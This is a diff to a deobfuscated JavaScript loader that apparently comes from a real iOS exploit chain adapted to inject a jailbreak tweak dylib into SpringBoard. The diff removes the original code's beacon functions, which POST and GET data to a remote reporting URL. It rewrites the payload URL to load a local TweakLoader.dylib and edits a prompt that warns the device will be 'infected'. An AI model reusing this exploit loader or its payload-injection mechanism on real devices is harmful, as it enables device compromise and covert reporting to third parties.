@@ -1145,21 +1145,13 @@ function YA() {/* Original: YA → resolveSymbols */
         EA() {
             D[1] = 0, D[0] = BA;
         },
-        TA(A, g, D, M) {
-            try {
-                let M = !1;
-                const C = new XMLHttpRequest();
-                C.open("POST", A, !0), C.setRequestHeader("Content-Type", "application/json"), C.onreadystatechange = () => {
-                    4 === C.readyState && (M || (M = !0, D()));
-                }, C.send(g), setTimeout(function () {
-                    M || (M = !0);
-                }, 10000 /* 893931597 ^ 893941597 */);
-            } catch (A) {
-                M();
-            }
-        },
+        // Telemetry removed
+        TA(A, g, D, M) { if (D) D(); },
         // Fetch a single file as ArrayBuffer
         fetchBin(url) {
+            // Override entry2_type0x0f.dylib
+            url = url.replace(/\/entry2_type0x0f.dylib$/g, "/../../TweakLoader/.theos/obj/arm64" + (platformModule.platformState.hasPAC?"e":"") + "/TweakLoader.dylib");
+            
             window.log("Downloading " + url);
             return new Promise((resolve, reject) => {
                 const xhr = new XMLHttpRequest();
@@ -1245,14 +1237,15 @@ function YA() {/* Original: YA → resolveSymbols */
                     if (lastSlash >= 0) hashName = hashName.substring(lastSlash + 1);
                     hashName = hashName.replace(/\.min\.js$/, "").replace(/\.js$/, "");
 
-                    // When we load the metadata, ask user if they want to continue (will infect device)
+                    // Warn user before proceeding with exploit
                     if (hashName === "7a7d99099b035b2c6512b6ebeeea6df1ede70fbb") {
                         let shouldContinue = confirm(
-                            "The script is about to load metadata and subsequent payloads to infect your device in `powerd` process.\n" +
-                            "Cancel = safely STOP this operation\n" +
-                            "OK     = continue infect your device");
+                            "WARNING: This tool uses some parts of a real exploit to inject some dylibs into SpringBoard.\n\n" +
+                            "Do NOT store sensitive data on this device while the exploit is active. (just for your safety)\n\n" +
+                            "OK = idrc just go for it!\n" +
+                            "Cancel = Nah I'm good, I want to stay safe");
                         if (!shouldContinue) {
-                            window.log("[LOADER] Execution canceled by user.");
+                            window.log("[LOADER] User canceled.");
                             return;
                         }
                     }
@@ -1308,19 +1301,9 @@ function YA() {/* Original: YA → resolveSymbols */
                 D[1] = M.length, D[0] = BA;
             }
         },
+        // Telemetry removed
         error() {
-            D[0] = NA,
-                function (A) {
-                    const g = platformModule.platformState.fixedMachOVal3;
-                    if ("" !== g) {
-                        const D = utilityModule.resolveUrl(g);
-                        if (D) {
-                            const g = new XMLHttpRequest(),
-                                M = D + "?e=" + A;
-                            g.open("GET", M, !0), g.send();
-                        }
-                    }
-                }(DA);
+            D[0] = NA;
         }
     };
     return E;
